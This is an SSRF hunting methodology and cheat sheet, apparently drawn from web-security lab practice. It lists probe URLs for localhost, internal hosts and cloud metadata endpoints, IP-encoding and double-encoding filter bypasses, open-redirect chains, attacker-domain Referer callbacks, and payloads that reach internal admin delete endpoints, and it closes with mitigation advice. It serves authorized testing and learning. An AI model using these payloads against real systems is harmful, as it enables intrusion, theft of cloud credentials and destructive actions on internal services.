### SSRF Hunt Methodology

Use only with explicit authorization. This decision tree aligns with your encounters (127.1 shortcut, double-encoded admin, Referer sink, open-redirect chaining) and best practices.

---

## Decision tree: question-driven hunting

1) Find SSRF sinks
- URL-taking parameters (e.g., `stockApi`, `url`, `path`, `feed`, `callback`).
- Headers/cookies (e.g., `Referer`, `X-Forwarded-Host`, `X-Original-URL`).
- File importers, webhooks, PDF/image fetchers, server-side previews.

2) Baseline probes
- Localhost shortcuts: `http://127.0.0.1/`, `http://127.1`, `http://localhost/`.
- Internal nets: `http://192.168.0.1/`, `http://10.0.0.1/`, services on ports.
- Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), GCP/Azure variants.

3) Observe filters and bypass
- IP/keyword blacklist (e.g., blocks `admin` or `127.0.0.1`):
  - Use encodings: `127%2e0%2e0%2e1`, IPv4 integer `2130706433`, octal `017700000001`, hex `0x7f000001`.
  - Use hostname tricks: `127.0.0.1.example.com`, `subdomain.127.0.0.1.nip.io`.
  - Use 127.1 shorthand.
  - Double-encode sensitive path segments: `%2561dmin` for `admin`.
- URL scheme restrictions: try `file://`, `gopher://` (service interactions), `dict://`, `ldap://` if client supports.
- Open redirect chaining: point to known open-redirect endpoint with `target=http://internal/`.

4) Alternate sinks
- Headers: set `Referer` to attacker domain and observe outbound requests/DNS; try `X-Forwarded-Host`, `X-Original-URL`.
- POST/JSON bodies when parameters not obvious; run param miner.

5) Blind SSRF confirmation
- Use OAST: `http://{domain}/p` and watch for DNS/HTTP hits.
- For GCP, add `Metadata-Flavor: Google` header; for Azure include `Metadata:true` param.

6) Target discovery
- Service scan via SSRF: iterate ports (21,25,53,80,139,443,993,1433,9200,6379) on `127.0.0.1` and RFC1918.
- Common internal admin paths: `/admin`, `/admin/delete`, `/login`, `/actuator`, `/metrics`, `/api/internal`.

7) Safety and impact
- Start with GET probes; avoid state-changing requests unless required by lab/scope.
- Prefer read-only metadata endpoints to demonstrate risk.

---

## Quick payload mapping

- Localhost: `http://127.1`, `http://127.0.0.1:8080/`
- Blacklist bypass: `http://127%2e0%2e0%2e1/`, `http://2130706433/`, `stockApi=http://127.1/%2561dmin/delete?username=carlos`
- Open redirect chain: `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
- Header sink: `Referer: http://{domain}/hit`
- Cloud: `http://169.254.169.254/latest/meta-data/`

---

## Reporting/mitigation

- Use allowlists of destinations; resolve and enforce IP ranges; block link-local (169.254.0.0/16) and localhost.
- Enforce scheme restrictions; disallow file/gopher/dict unless required.
- Do not follow redirects or re-resolve DNS post-validation; pin by IP.
- Require egress proxies with ACLs; log and alert unexpected outbound.


